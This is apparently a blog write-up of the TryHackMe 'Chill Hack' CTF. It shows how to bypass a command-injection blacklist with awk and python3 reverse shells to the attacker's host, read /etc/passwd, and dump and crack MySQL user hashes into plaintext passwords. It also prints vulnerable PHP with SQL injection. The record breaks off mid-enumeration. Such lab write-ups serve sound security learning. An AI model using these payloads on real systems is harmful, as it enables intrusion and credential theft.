---
layout: post
title: "Chill Hack"
date: "2023-08-08"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - TryHackMe
---

# Chill Hack
Tag: security, realworld, commandinjection, sqlinjection

Kali Linux : 10.18.72.222

Target IP Address : 10.10.244.240

## Task 1: Investigate!
Chill the Hack out of the Machine.

Easy level CTF.  Capture the flags and have fun!

```
┌──(root㉿kali)-[~]
└─# nmap 10.10.244.240                   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 04:24 EDT
Nmap scan report for 10.10.244.240
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 40.43 seconds
```

```
┌──(root㉿kali)-[~]
└─# nmap -sV -p 21,22,80 -sC 10.10.244.240
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 04:26 EDT
Nmap scan report for 10.10.244.240
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.72.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.37 seconds
```

ftp允许匿名登录，获取note.txt。

```
┌──(root㉿kali)-[~]
└─# ftp 10.10.244.240
Connected to 10.10.244.240.
220 (vsFTPd 3.0.3)
Name (10.10.244.240:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||55543|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> lcd /root/Downloads
Local directory now: /root/Downloads
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||42822|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |****************************************************************************************************************|    90      180.47 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.33 KiB/s)
ftp> 
```

note.txt的内容：

```
┌──(root㉿kali)-[~/Downloads]
└─# cat note.txt       
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

可能需要绕过某些正则表达式。

访问http://10.10.244.240/。

使用dirbuster检测目录。

```
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Sun Aug 06 04:55:41 EDT 2023
--------------------------------

http://10.10.244.240:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/images/
/css/
/js/
/fonts/
/secret/

Dirs found with a 403 response:

/icons/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/js/animate.js
/contact.php
/contact.html
/blog.html
/news.html
/index.html
/about.html
/js/all.js
/js/3dslider.js
/js/custom.js
/team.html
/css/3dslider.css
/css/bootstrap-theme.css
/css/animate.css
/css/bootstrap-theme.min.css.map
/css/bootstrap-theme.min.css
/css/owl.carousel.css
/css/flaticon.css
/js/map.js
/css/responsive.css
/js/hoverdir.js
/js/portfolio.js
/css/prettyPhoto.css
/js/modernizer.js
/css/font-awesome.min.css
/css/font-awesome.css
/css/bootstrap-theme.css.map
/js/jquery.vide.js
/js/retina.js
/js/scroll.js
/js/jquery.prettyPhoto.js
/css/bootstrap.css
/css/custom.css
/css/bootstrap.min.css
/js/owl.carousel.js
/fonts/Flaticon.woff
/fonts/_flaticon.scss
/fonts/flaticon.css
/fonts/Flaticon.ttf
/fonts/Flaticon.eot
/fonts/glyphicons-halflings-regular.eot
/fonts/glyphicons-halflings-regular.woff2
/fonts/glyphicons-halflings-regular.woff
/fonts/FontAwesome.otf
/fonts/flaticon.html
/fonts/glyphicons-halflings-regular.ttf
/fonts/fontawesome-webfont.eot
/css/bootstrap.min.css.map
/css/bootstrap.css.map
/fonts/fontawesome-webfont.woff
/fonts/fontawesome-webfont.woff2
/fonts/Flaticon.svg
/fonts/fontawesome-webfont.ttf
/fonts/glyphicons-halflings-regular.svg
/fonts/fontawesome-webfont.svg


--------------------------------
```

```
/
/images/
/icons/
/css/
/js/
/fonts/
/secret/
/js/animate.js
/contact.php
/contact.html
/blog.html
/news.html
/index.html
/about.html
/js/all.js
/js/3dslider.js
/js/custom.js
/team.html
/css/3dslider.css
/css/bootstrap-theme.css
/css/animate.css
/css/bootstrap-theme.min.css.map
/css/bootstrap-theme.min.css
/css/owl.carousel.css
/css/flaticon.css
/js/map.js
/css/responsive.css
/js/hoverdir.js
/js/portfolio.js
/css/prettyPhoto.css
/js/modernizer.js
/css/font-awesome.min.css
/css/font-awesome.css
/css/bootstrap-theme.css.map
/js/jquery.vide.js
/js/retina.js
/js/scroll.js
/js/jquery.prettyPhoto.js
/css/bootstrap.css
/css/custom.css
/css/bootstrap.min.css
/js/owl.carousel.js
/fonts/Flaticon.woff
/fonts/_flaticon.scss
/fonts/flaticon.css
/fonts/Flaticon.ttf
/fonts/Flaticon.eot
/fonts/glyphicons-halflings-regular.eot
/fonts/glyphicons-halflings-regular.woff2
/fonts/glyphicons-halflings-regular.woff
/fonts/FontAwesome.otf
/fonts/flaticon.html
/fonts/glyphicons-halflings-regular.ttf
/fonts/fontawesome-webfont.eot
/css/bootstrap.min.css.map
/css/bootstrap.css.map
/fonts/fontawesome-webfont.woff
/fonts/fontawesome-webfont.woff2
/fonts/Flaticon.svg
/fonts/fontawesome-webfont.ttf
/fonts/glyphicons-halflings-regular.svg
/fonts/fontawesome-webfont.svg
```

发现一个有趣的目录：/secret/

http://10.10.244.240/secret/

是一个可以执行命令的页面！

```
whoami

www-data
```

```
id

uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

```
uname -a

Linux ubuntu 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

```
sudo -l

Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

```
sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Thank you for your precious time!
```

```
groups apaar

apaar : apaar
```

```
groups anurodh

anurodh : anurodh docker
```

```
cat /etc/*issue

Are you a hacker?
```

```
cat /etc/passwd

Are you a hacker?
```

```
pwd

/var/www/html/secret
```

```
ls -al

Are you a hacker?
```

重启了一下Lab:

Kali Linux : 10.18.72.222

Target IP Address : 10.10.235.51

bash，php，python等关键字都被过滤掉了，但是可以使用awk来获取reverse shell。

[Reverse Shell Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#awk)

在http://10.10.235.51/secret/页面执行以下命令：

```
awk 'BEGIN {s = "/inet/tcp/0/10.18.72.222/1234"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

成功获取reverse shell。

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.18.72.222] from (UNKNOWN) [10.10.235.51] 46705
shell>pwd
/var/www/html/secret
shell>whoami
www-data
shell>id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
shell>pwd
/var/www/html/secret
shell>ls
images
index.php
```

服务器端黑名单中有以下内容：'nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls'

```php
shell>cat index.php
<html>
<body>

<form method="POST">
        <input id="comm" type="text" name="command" placeholder="Command">
        <button>Execute</button>
</form>
<?php
        if(isset($_POST['command']))
        {
                $cmd = $_POST['command'];
                $store = explode(" ",$cmd);
                $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
                for($i=0; $i<count($store); $i++)
                {
                        for($j=0; $j<count($blacklist); $j++)
                        {
                                if($store[$i] == $blacklist[$j])
                                {?>
                                        <h1 style="color:red;">Are you a hacker?</h1>
                                        <style>
                                                body
                                                {
                                                        background-image: url('images/FailingMiserableEwe-size_restricted.gif');
                                                        background-position: center center;
                                                        background-repeat: no-repeat;
                                                        background-attachment: fixed;
                                                        background-size: cover;
        }
                                        </style>
<?php                                    return;
                                }
                        }
                }
                ?><h2 style="color:blue;"><?php echo shell_exec($cmd);?></h2>
                        <style>
                             body
                             {
                                   background-image: url('images/blue_boy_typing_nothought.gif');  
                                   background-position: center center;
                                   background-repeat: no-repeat;
                                   background-attachment: fixed;
                                   background-size: cover;
}
                          </style>
        <?php }
?>
</body>
</html>
```

有3个用户：root、apaar、anurodh。

```
shell>cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
apaar:x:1001:1001:,,,:/home/apaar:/bin/bash
anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

```
shell>groups root
root : root
shell>groups apaar
apaar : apaar
shell>groups anurodh
anurodh : anurodh docker
```

```
shell>ls -al /var/www/html
total 264
drwxr-xr-x 8 root root  4096 Oct  3  2020 .
drwxr-xr-x 4 root root  4096 Oct  3  2020 ..
-rw-r--r-- 1 root root 21339 May 31  2018 about.html
-rw-r--r-- 1 root root 30279 May 31  2018 blog.html
-rw-r--r-- 1 root root 18301 May 31  2018 contact.html
-rw-r--r-- 1 root root  3769 Oct 24  2017 contact.php
drwxr-xr-x 2 root root  4096 May 31  2018 css
drwxr-xr-x 2 root root  4096 May 31  2018 fonts
drwxr-xr-x 4 root root  4096 May 31  2018 images
-rw-r--r-- 1 root root 35184 May 31  2018 index.html
drwxr-xr-x 2 root root  4096 May 31  2018 js
-rw-r--r-- 1 root root 19718 May 31  2018 news.html
drwxr-xr-x 2 root root  4096 May 31  2018 preview_img
drwxr-xr-x 3 root root  4096 Oct  4  2020 secret
-rw-r--r-- 1 root root 32777 May 31  2018 single-blog.html
-rw-r--r-- 1 root root 37910 May 31  2018 style.css
-rw-r--r-- 1 root root 19868 May 31  2018 team.html
```

/var/www/html/contact.php不存在SQL注入，因为根本没和数据库交互。

```php
shell>cat /var/www/html/contact.php
<?php

if(!$_POST) exit;

// Email address verification, do not edit.
function isEmail($email) {
        return(preg_match("/^[-_.[:alnum:]]+@((([[:alnum:]]|[[:alnum:]][[:alnum:]-]*[[:alnum:]])\.)+(ad|ae|aero|af|ag|ai|al|am|an|ao|aq|ar|arpa|as|at|au|aw|az|ba|bb|bd|be|bf|bg|bh|bi|biz|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|com|coop|cr|cs|cu|cv|cx|cy|cz|de|dj|dk|dm|do|dz|ec|edu|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gh|gi|gl|gm|gn|gov|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|in|info|int|io|iq|ir|is|it|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mil|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|museum|mv|mw|mx|my|mz|na|name|nc|ne|net|nf|ng|ni|nl|no|np|nr|nt|nu|nz|om|org|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|pro|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)$|(([0-9][0-9]?|[0-1][0-9][0-9]|[2][0-4][0-9]|[2][5][0-5])\.){3}([0-9][0-9]?|[0-1][0-9][0-9]|[2][0-4][0-9]|[2][5][0-5]))$/i",$email));
}

if (!defined("PHP_EOL")) define("PHP_EOL", "\r\n");

$first_name     = $_POST['first_name'];
$last_name     = $_POST['last_name'];
$email    = $_POST['email'];
$phone   = $_POST['phone'];
$select_price   = $_POST['select_price'];
$select_service   = $_POST['select_service'];
$subject  = $_POST['subject'];
$comments = $_POST['comments'];
$verify   = $_POST['verify'];

if(trim($first_name) == '') {
        echo '<div class="error_message">Attention! You must enter your name.</div>';
        exit();
}  else if(trim($email) == '') {
        echo '<div class="error_message">Attention! Please enter a valid email address.</div>';
        exit();
} else if(!isEmail($email)) {
        echo '<div class="error_message">Attention! You have enter an invalid e-mail address, try again.</div>';
        exit();
}

if(trim($comments) == '') {
        echo '<div class="error_message">Attention! Please enter your message.</div>';
        exit();
}

if(get_magic_quotes_gpc()) {
        $comments = stripslashes($comments);
}


// Configuration option.
// Enter the email address that you want to emails to be sent to.
// Example $address = "joe.doe@yourdomain.com";

//$address = "example@themeforest.net";
$address = "example@yourdomain.com";


// Configuration option.
// i.e. The standard subject will appear as, "You've been contacted by John Doe."

// Example, $e_subject = '$name . ' has contacted you via Your Website.';

$e_subject = 'You\'ve been contacted by ' . $first_name . '.';


// Configuration option.
// You can change this if you feel that you need to.
// Developers, you may wish to add more fields to the form, in which case you must be sure to add them here.

$e_body = "You have been contacted by $first_name. $first_name selected service of $select_service, their additional message is as follows. Customer max budge is $select_price, for this project." . PHP_EOL . PHP_EOL;
$e_content = "\"$comments\"" . PHP_EOL . PHP_EOL;
$e_reply = "You can contact $first_name via email, $email or via phone $phone";

$msg = wordwrap( $e_body . $e_content . $e_reply, 70 );

$headers = "From: $email" . PHP_EOL;
$headers .= "Reply-To: $email" . PHP_EOL;
$headers .= "MIME-Version: 1.0" . PHP_EOL;
$headers .= "Content-type: text/plain; charset=utf-8" . PHP_EOL;
$headers .= "Content-Transfer-Encoding: quoted-printable" . PHP_EOL;

if(mail($address, $e_subject, $msg, $headers)) {

        // Email has sent successfully, echo a success page.

        echo "<fieldset>";
        echo "<div id='success_page'>";
        echo "<h1>Email Sent Successfully.</h1>";
        echo "<p>Thank you <strong>$first_name</strong>, your message has been submitted to us.</p>";
        echo "</div>";
        echo "</fieldset>";

} else {

        echo 'ERROR!';

}
```

```
shell>find / -name *.php 2>/dev/null
/var/www/html/secret/index.php
/var/www/files/index.php
```

在/var/www/files/index.php中发现可能的mysql用户名和密码：root : !@m+her00+@db

```
shell>cat /var/www/files/index.php
<html>
<body>
<?php
        if(isset($_POST['submit']))
        {
                $username = $_POST['username'];
                $password = $_POST['password'];
                ob_start();
                session_start();
                try
                {
                        $con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
                        $con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
                }
                catch(PDOException $e)
                {
                        exit("Connection failed ". $e->getMessage());
                }
                require_once("account.php");
                $account = new Account($con);
                $success = $account->login($username,$password);
                if($success)
                {
                        header("Location: hacker.php");
                }
        }
?>
<link rel="stylesheet" type="text/css" href="style.css">
        <div class="signInContainer">
                <div class="column">
                        <div class="header">
                                <h2 style="color:blue;">Customer Portal</h2>
                                <h3 style="color:green;">Log In<h3>
                        </div>
                        <form method="POST">
                                <?php echo $success?>
                                <input type="text" name="username" id="username" placeholder="Username" required>
                                <input type="password" name="password" id="password" placeholder="Password" required>
                                <input type="submit" name="submit" value="Submit">
                        </form>
                </div>
        </div>
</body>
</html>
```

awk reverse shell看不到报错， 因此需要spwan一个python reverse shell。注意，目标没有装python，只有python3。

```
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.72.222",7788));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 7788
listening on [any] 7788 ...
connect to [10.18.72.222] from (UNKNOWN) [10.10.235.51] 59086
www-data@ubuntu:/var/www/html/secret$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/html/secret$ whoami
whoami
www-data
www-data@ubuntu:/var/www/html/secret$ su root
su root
Password: !@m+her00+@db

su: Authentication failure
www-data@ubuntu:/var/www/html/secret$ mysql -u root -p
mysql -u root -p
Enter password: !@m+her00+@db

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

```
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.00 sec)
```

```
mysql> use webportal;
use webportal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```
mysql> show tables;
show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)
```

```
mysql> select * from users;
select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)
```

上述的Hash类型是MD5或MD4。

将上面的Hash保存为md5.txt，并用hashcat破解。

```
┌──(root㉿kali)-[~/Downloads]
└─# hashcat -m 0 md5.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i7-10875H CPU @ 2.30GHz, 6936/13936 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

686216240e5af30df0501e53c789a649:dontaskdonttell          
7e53614ced3640d5de23f111806cc4fd:masterpassword           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: md5.txt
Time.Started.....: Mon Aug  7 04:20:24 2023 (1 sec)
Time.Estimated...: Mon Aug  7 04:20:25 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4504.6 kH/s (0.22ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)
Progress.........: 5738496/14344385 (40.01%)
Rejected.........: 0/5738496 (0.00%)
Restore.Point....: 5734400/14344385 (39.98%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: maston420 -> mason3601
Hardware.Mon.#1..: Util: 47%

Started: Mon Aug  7 04:20:20 2023
Stopped: Mon Aug  7 04:20:26 2023
```

直接获得两个密码：

```
686216240e5af30df0501e53c789a649:dontaskdonttell          
7e53614ced3640d5de23f111806cc4fd:masterpassword   
```

Target IP Address : 10.10.14.124

Kali Linux : 10.18.72.222

```
www-data@ubuntu:/var/www/html/secret$ ls -al /var/www/files
ls -al /var/www/files
total 28
drwxr-xr-x 3 root root 4096 Oct  3  2020 .
drwxr-xr-x 4 root root 4096 Oct  3  2020 ..
-rw-r--r-- 1 root root  391 Oct  3  2020 account.php
-rw-r--r-- 1 root root  453 Oct  3  2020 hacker.php
drwxr-xr-x 2 root root 4096 Oct  3  2020 images
-rw-r--r-- 1 root root 1153 Oct  3  2020 index.php
-rw-r--r-- 1 root root  545 Oct  3  2020 style.css
```

```php
www-data@ubuntu:/var/www/html$ cat /var/www/files/index.php
cat /var/www/files/index.php
<html>
<body>
<?php
        if(isset($_POST['submit']))
        {
                $username = $_POST['username'];
                $password = $_POST['password'];
                ob_start();
                session_start();
                try
                {
                        $con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
                        $con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
                }
                catch(PDOException $e)
                {
                        exit("Connection failed ". $e->getMessage());
                }
                require_once("account.php");
                $account = new Account($con);
                $success = $account->login($username,$password);
                if($success)
                {
                        header("Location: hacker.php");
                }
        }
?>
<link rel="stylesheet" type="text/css" href="style.css">
        <div class="signInContainer">
                <div class="column">
                        <div class="header">
                                <h2 style="color:blue;">Customer Portal</h2>
                                <h3 style="color:green;">Log In<h3>
                        </div>
                        <form method="POST">
                                <?php echo $success?>
                                <input type="text" name="username" id="username" placeholder="Username" required>
                                <input type="password" name="password" id="password" placeholder="Password" required>
                                <input type="submit" name="submit" value="Submit">
                        </form>
                </div>
        </div>
</body>
</html>
```

```php
www-data@ubuntu:/var/www/html/secret$ cat /var/www/files/account.php
cat /var/www/files/account.php
<?php

class Account
{
        public function __construct($con)
        {
                $this->con = $con;
        }
        public function login($un,$pw)
        {
                $pw = hash("md5",$pw);
                $query = $this->con->prepare("SELECT * FROM users WHERE username='$un' AND password='$pw'");
                $query->execute();
                if($query->rowCount() >= 1)
                {
                        return true;
                }?>
                <h1 style="color:red";>Invalid username or password</h1>
        <?php }
}

?>
```

```php
www-data@ubuntu:/var/www/html/secret$ cat /var/www/files/hacker.php
cat /var/www/files/hacker.php
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
        color:red;
        font-weight: bold;
}
h1
{
        color: yellow;
        font-weight: bold;
}
</style>
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
```

```
www-data@ubuntu:/var/www/html/secret$ ls -al /home
ls -al /home
total 20
drwxr-xr-x  5 root    root    4096 Oct  3  2020 .
drwxr-xr-x 24 root    root    4096 Oct  3  2020 ..
drwxr-x---  2 anurodh anurodh 4096 Oct  4  2020 anurodh
drwxr-xr-x  5 apaar   apaar   4096 Oct  4  2020 apaar
drwxr-x---  4 aurick  aurick  4096 Oct  3  2020 aurick
```

```
www-data@ubuntu:/var/www/html/secret$ ls -al /home/anurodh
ls -al /home/anurodh
ls: cannot open directory '/home/anurodh': Permission denied
www-data@ubuntu:/var/www/html/secret$ ls -al /home/apaar
ls -al /home/apaar
total 44
drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
drwxr-xr-x 5 root  root  4096 Oct  3  2020 ..
-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
-rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
www-data@ubuntu:/var/www/html/secret$ ls -al /home/aurick
ls -al /home/aurick
ls: cannot open directory '/home/aurick': Permission denied
www-data@ubuntu:/var/www/html/secret$ cat /home/apaar/local.txt
cat /home/apaar/local.txt
cat: /home/apaar/local.txt: Permission denied
```

MySQL进程不是以root身份运行，这样提权无意义。

[Use MySQL user-defined functions for privilege escalation](https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf)

```
www-data@ubuntu:/var/www/html/secret$ ps aux | grep mysql
ps aux | grep mysql
mysql     1264  0.0  8.9 1162208 182920 ?      Sl   08:25   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
www-data  2216  0.0  0.0  11464  1000 pts/0    S+   10:03   0:00 grep mysql
```

发现：127.0.0.1:9001。

```
www-data@ubuntu:/var/www/html$ netstat -antup            
netstat -antup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0    300 10.10.14.124:48776      10.18.72.222:5678       ESTABLISHED 1811/python3        
tcp        0      0 10.10.14.124:41187      10.18.72.222:1234       ESTABLISHED 1759/awk            
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 10.10.14.124:80         10.18.72.222:46872      ESTABLISHED -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.14.124:68         0.0.0.0:*                           -   
```

这里运行着/var/www/files中的应用程序。我该如何从Kali本地浏览器直接访问只对目标127.0.0.1:9001端口开放的Web应用？

```
www-data@ubuntu:/var/www/html$ curl http://127.0.0.1:9001
curl http://127.0.0.1:9001
<html>
<body>
<link rel="stylesheet" type="text/css" href="style.css">
